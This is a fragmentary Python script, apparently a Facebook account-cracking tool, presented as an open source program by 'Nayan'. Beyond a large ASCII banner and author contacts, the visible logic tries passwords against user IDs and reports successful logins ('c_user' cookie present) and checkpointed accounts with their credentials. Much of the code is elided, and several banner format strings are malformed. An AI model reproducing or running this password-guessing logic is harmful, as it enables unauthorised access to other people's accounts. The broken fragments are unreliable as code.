...
this is an open source program by Mr. Error (Nayan-Vau)
...
def banner():
	...
	print("%s888b    888        d8888 Y88b   d88P     d8888 888b    888 "%(M))

	print("%8888b   888       d88888  Y88b d88P     d88888 8888b   888 "%(M))

	print("%88888b  888      d88P888   Y88o88P     d88P888 88888b  888 "%(M))

	print("%888Y88b 888     d88P 888    Y888P     d88P 888 888Y88b 888 "%(M))

	print("%888 Y88b888    d88P  888     888     d88P  888 888 Y88b888 "%(M))

	print("%888  Y88888   d88P   888     888    d88P   888 888  Y88888 "%(Z))

	print("%888   Y8888  d8888888888     888   d8888888888 888   Y8888 "%(Z))

	print("%888    Y888 d88P     888     888  d88P     888 888    Y888 "%(Z))

	print("")

	print("%s╔══════════════════════════════════════════╗"%(Z))

	print("%s║%s  Author   : %sNAYAN                   %s║"%(Z,B,M,Z))

	print("%s║%s  Facebook : NAYAN Talukdar %s║"%(Z,B,Z))

	print("%s║%s  Telegram : Nayan   %s║"%(Z,B,Z))
	...
	try:
		...
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				print('\033[1;32m [Nayan-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				print('\033[1;31m [Nayan-CP] '+uidx+' | '+pasw+'\033[0;97m')
